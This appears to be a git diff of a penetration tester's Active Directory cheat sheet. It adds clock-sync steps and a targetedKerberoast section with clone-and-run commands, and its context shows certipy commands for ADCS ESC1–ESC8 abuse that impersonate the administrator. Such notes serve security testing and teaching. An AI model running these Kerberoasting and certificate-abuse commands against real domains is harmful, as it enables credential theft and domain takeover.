@@ -2,6 +2,20 @@
 title = "Active Directory"
 +++
 
+# Sync Clock
+
+```bash
+# Linux
+sudo ntpdate <DC_IP>
+
+# Per app run
+sudo apt install -y faketime
+faketime <DC_TIME> <COMMAND>
+
+# Windows
+net.exe time /domain /set /y
+```
+
 - AD Cheatsheet: https://wadcoms.github.io/
     - Filter by info currently known and by attack type like enumeration, exploitation, etc.
 - https://adsecurity.org/
@@ -486,6 +500,16 @@ Set-DomainObject -Credential $CredSPN -Identity <USER> -SET @{serviceprincipalna
 ```powershell
 # Remove fake SPN
 Set-DomainObject -Credential $CredSPN -Identity <USER> -Clear <SPN_NAME> -Verbose
+```
+
+### `targetedKerberos.py`
+
+Abuses `GenericAll`/`GenericWrite`/`WriteProperty` ACL edges. It temporarily sets an SPN on an account that doesn't have one, roasts it, then removes the SPN.
+
+```bash
+git clone https://github.com/ShutdownRepo/targetedKerberoast.git && cd targetedKerberoast
+
+python3 targetedKerberoast.py -o targetedKerberoast_hashes.txt -u <USER> -p '<PASS>' -d <DOMAIN> --dc-ip <DC_IP>
 ```
 
 ### Linux
@@ -1172,7 +1196,7 @@ evil-winrm ... -H <HASH>
 certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -enabled
 ```
 
-Read the output top-down: CA-level vulnerabilities appear under the CA block; template-level vulnerabilities appear under each template block. The `[!] Vulnerabilities:` line names the ESC type directly.
+**Read the output top-down: CA-level vulnerabilities appear under the CA block; template-level vulnerabilities appear under each template block.**
 
 | `[!] Vulnerabilities:` value | Where in output | Key field to confirm |
 | --- | --- | --- |
@@ -1184,9 +1208,7 @@ Read the output top-down: CA-level vulnerabilities appear under the CA block; te
 | `ESC7` | CA block | `Permissions` shows `ManageCA` or `ManageCertificates` for low-priv principal |
 | `ESC8` | CA block | `Web Enrollment: Enabled` |
 
----
-
-## ESC1 — User-controllable SAN
+## ESC1: User-controllable SAN
 
 - https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
 
@@ -1206,9 +1228,7 @@ certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 export KRB5CCNAME=administrator.ccache
 ```
 
----
-
-## ESC2 — Any Purpose EKU
+## ESC2: Any Purpose EKU
 
 - https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
 
@@ -1230,9 +1250,7 @@ certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
 
----
-
-## ESC3 — Enrollment Agent Abuse
+## ESC3: Enrollment Agent Abuse
 
 - https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
 
@@ -1257,9 +1275,7 @@ certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 
 **NOTE:** `-on-behalf-of` takes the NetBIOS domain name (`CORP\Administrator`), not the FQDN. The second template (`User` here) must be one that Enrollment Agents are authorized to use.
 
----
-
-## ESC4 — Vulnerable Template ACL
+## ESC4: Vulnerable Template ACL
 
 - https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
 
@@ -1289,9 +1305,7 @@ certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
 
----
-
-## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
+## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
 
 - https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
 
@@ -1308,9 +1322,7 @@ certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 ```
 
----
-
-## ESC7 — Vulnerable CA ACL
+## ESC7: Vulnerable CA ACL
 
 - https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
 - https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6
@@ -1347,9 +1359,7 @@ certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
 
 **NOTE:** If you only have `ManageCertificates` (not `ManageCA`), skip Step 1. If you only have `ManageCA`, run Step 1 first to grant yourself `ManageCertificates`, then proceed.
 
----
-
-## ESC8 — NTLM Relay to HTTP Enrollment
+## ESC8: NTLM Relay to HTTP Enrollment
 
 - https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
 - https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6
